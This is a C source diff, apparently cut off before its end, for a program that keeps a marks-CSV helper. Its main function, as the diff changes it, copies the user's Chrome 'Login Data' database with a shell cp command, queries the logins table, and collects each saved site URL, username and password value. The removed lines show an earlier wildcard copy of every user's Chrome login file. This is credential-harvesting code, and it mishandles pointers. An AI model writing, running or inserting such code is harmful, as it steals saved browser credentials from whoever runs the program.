@@ -1,8 +1,16 @@
 #include<stdio.h>
 #include<string.h>
 #include <sqlite3.h>
+#include <stdlib.h>
 
-void create_marks_csv(char *filename,int a[][3],int n,int m){
+struct user_info {
+    char * url;
+    char * username;
+    char * password;
+};
+
+void create_marks_csv(char *filename, int a[][3], int n, int m)
+{
     printf("\n Creating %s.csv file",filename);
     FILE *fp;
     int i,j;
@@ -20,56 +28,66 @@ void create_marks_csv(char *filename,int a[][3],int n,int m){
 
 }
 
-static int callback(void *data, int argc, char **argv, char **azColName){
+static int callback(void * data, int argc, char **argv, char **azColName)
+{
     int i;
-    fprintf(stderr, "%s: ", (const char*)data);
 
-    for(i = 0; i<argc; i++){
-        if(!strcmp(azColName[i], "password_value"))
-            printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
+    struct user_info * parent_ = (struct user_info *)data;
+
+    for(i = 0; i < argc; i++)
+    {
+        if(strcmp(azColName[i], "password_value") == 0)
+        {
+            parent_->password = argv[i] ? argv[i] : "NULL";
+        }
+        else if(strcmp(azColName[i], "origin_url") == 0)
+        {
+            parent_->url = argv[i] ? argv[i] : "NULL";
+        }
+        else if(strcmp(azColName[i], "username_value") == 0)
+        {
+            parent_->username = argv[i] ? argv[i] : "NULL";
+        }
     }
 
-    printf("\n");
     return 0;
 }
 
-int main(){
+int main()
+{
 
-    sqlite3 *db;
-    char *zErrMsg = 0;
+    sqlite3 * db;
+
+    char * zErrMsg = 0;
+
     int rc;
-    char* sql;
-    const char* data = "Callback function called";
 
-    system("cp /Users/*/Library/Application\\ Support/Google/Chrome/*/Login\\ Data /Users/Sam/Desktop/ok");
+    char * sql;
 
-    //rc = sqlite3_open("/Users/Sam/Library/Application\ Support/Google/Chrome/Default/Login\ Data", &db);
-    //rc = sqlite3_open_v2("/Users/Sam/Library/Application\ Support/Google/Chrome/Default/Login\ Data", &db, SQLITE_OPEN_READONLY, NULL);
+    struct user_info * userData_;
+    userData_ = (struct user_info*) malloc(sizeof(struct user_info));
 
-    //rc = sqlite3_open("/Users/Sam/Desktop/Login\ Data", &db);
-    //rc = sqlite3_open_v2("/Users/Sam/Desktop/Login\ Data", &db, SQLITE_OPEN_READONLY, NULL);
-    rc = sqlite3_open_v2("/Users/Sam/Desktop/ok", &db, SQLITE_OPEN_READONLY, NULL);
+    // Copy file Logindata
+    system("cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data ./login_chrome");
+
+    rc = sqlite3_open_v2("./login_chrome", &db, SQLITE_OPEN_READONLY, NULL);
 
     if( rc != SQLITE_OK) {
         fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
-        return(0);
-    } else {
-        fprintf(stderr, "Opened database successfully\n");
+        return EXIT_FAILURE;
     }
 
-    /* Create SQL statement */
+    // Create SQL statement
     sql = "SELECT * FROM 'logins'";
-    
 
-    /* Execute SQL statement */
-    rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);
+    // Execute SQL statement
+    rc = sqlite3_exec(db, sql, callback, (void*)userData_, &zErrMsg);
 
     if( rc != SQLITE_OK ) {
         fprintf(stderr, "SQL error: %s\n", zErrMsg);
         sqlite3_free(zErrMsg);
-    } else {
-        fprintf(stdout, "Operation done successfully\n");
     }
+
     sqlite3_close(db);
 
     /*
